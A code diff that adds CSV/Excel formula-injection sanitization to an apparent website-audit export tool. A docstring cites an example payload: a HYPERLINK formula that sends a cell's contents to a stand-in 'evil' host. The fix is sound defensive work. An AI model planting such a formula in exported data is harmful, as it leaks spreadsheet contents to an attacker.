@@ -16,6 +16,29 @@ def _score_label(score):
     return "Critical"
 
 
+_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@")
+
+
+def _sanitize_cell(value):
+    """Neutralize CSV/Excel formula injection.
+
+    Page-controlled strings (title, description, anchor text, etc.) are
+    exported verbatim into CSV/XLSX cells. If such a value starts with a
+    formula-trigger character (=, +, -, @), Excel/Sheets may interpret it
+    as a formula when the export is later opened, e.g. a page whose
+    <title> is '=HYPERLINK("http://evil/?"&A1,"x")'. Prefixing with a
+    single quote forces spreadsheet apps to treat it as literal text.
+    """
+    if isinstance(value, str) and value.startswith(_FORMULA_TRIGGER_CHARS):
+        return "'" + value
+    return value
+
+
+def _sanitize_row(row: dict) -> dict:
+    """Apply `_sanitize_cell` to every value in a flattened row dict."""
+    return {k: _sanitize_cell(v) for k, v in row.items()}
+
+
 def flatten(result):
     issues = result.get("all_issues", [])
     sev = lambda s: sum(1 for i in issues if i.get("severity") == s)
@@ -30,7 +53,7 @@ def flatten(result):
     el = result.get("external_links", {})
     checklist_summary = (result.get("technical_audit_checklist") or {}).get("summary", {}) or {}
 
-    return {
+    return _sanitize_row({
         "URL": result.get("url", ""),
         "Audit Type": result.get("audit_type", "").title(),
         "Status Code": result.get("status_code", ""),
@@ -64,7 +87,7 @@ def flatten(result):
         "Checklist Warnings": checklist_summary.get("warning", ""),
         "Checklist Failed": checklist_summary.get("fail", ""),
         "Fetch Error": result.get("fetch_error", ""),
-    }
+    })
 
 
 def generate_csv(results):
@@ -84,13 +107,13 @@ def generate_excel(results):
     for r in results:
         url = r.get("url", "")
         for iss in r.get("all_issues", []):
-            issue_rows.append({
+            issue_rows.append(_sanitize_row({
                 "URL": url,
                 "Issue": iss.get("issue", ""),
                 "Category": iss.get("category", ""),
                 "Severity": iss.get("severity", ""),
                 "Recommendation": iss.get("recommendation", ""),
-            })
+            }))
     issues_df = pd.DataFrame(issue_rows) if issue_rows else pd.DataFrame(
         columns=["URL", "Issue", "Category", "Severity", "Recommendation"]
     )
@@ -99,7 +122,7 @@ def generate_excel(results):
     for r in results:
         url = r.get("url", "")
         for link in r.get("internal_links", {}).get("links", []):
-            link_rows.append({
+            link_rows.append(_sanitize_row({
                 "Source URL": url,
                 "Type": "Internal",
                 "Link URL": link.get("url", ""),
@@ -109,9 +132,9 @@ def generate_excel(results):
                 "Has Noopener": link.get("has_noopener", ""),
                 "Status Code": link.get("status_code", "N/A"),
                 "Is Broken": link.get("is_broken", "N/A"),
-            })
+            }))
         for link in r.get("external_links", {}).get("links", []):
-            link_rows.append({
+            link_rows.append(_sanitize_row({
                 "Source URL": url,
                 "Type": "External",
                 "Link URL": link.get("url", ""),
@@ -121,7 +144,7 @@ def generate_excel(results):
                 "Has Noopener": link.get("has_noopener", ""),
                 "Status Code": link.get("status_code", "N/A"),
                 "Is Broken": link.get("is_broken", "N/A"),
-            })
+            }))
     links_df = pd.DataFrame(link_rows) if link_rows else pd.DataFrame()
 
     checklist_rows = []
@@ -129,13 +152,13 @@ def generate_excel(results):
         url = r.get("url", "")
         checklist = r.get("technical_audit_checklist", {}) or {}
         for c in checklist.get("checks", []):
-            checklist_rows.append({
+            checklist_rows.append(_sanitize_row({
                 "URL": url,
                 "Group": (c.get("group", "") or "").replace("_", " ").title(),
                 "Check": c.get("label", ""),
                 "Status": (c.get("status", "") or "").title(),
                 "Detail": c.get("detail", ""),
-            })
+            }))
     checklist_df = pd.DataFrame(checklist_rows) if checklist_rows else pd.DataFrame()
 
     with pd.ExcelWriter(buf, engine="xlsxwriter") as writer:
@@ -206,6 +229,11 @@ def generate_excel(results):
 
 
 def generate_pdf(results):
+    # No CSV/Excel-style formula-injection sanitization here: FPDF just draws
+    # text into PDF cells (`pdf.cell(...)`), it never evaluates spreadsheet
+    # formulas, so a page-controlled string starting with "=" or "@" has no
+    # special meaning to fpdf2/PDF viewers, there's no equivalent injection
+    # vector to guard against for this export path.
     try:
         from fpdf import FPDF
 
